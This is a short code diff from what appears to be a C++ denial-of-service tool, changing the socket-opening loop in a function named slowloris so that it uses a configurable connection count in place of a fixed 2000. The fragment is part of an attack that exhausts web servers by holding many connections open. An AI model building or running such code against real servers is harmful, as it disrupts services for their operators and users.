@@ -35,7 +35,7 @@ void slowloris(PVOID p) {
   while (true) {
     std::chrono::milliseconds timeout((rand() % 10000 + 1) + 1000);
     if (sockets.size() < connections) {
-      for (int i = sockets.size(); i < 2000; i++) {
+      for (int i = sockets.size(); i < connections; i++) {
         SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         if (s != INVALID_SOCKET) {
           sockets.push_back(s);
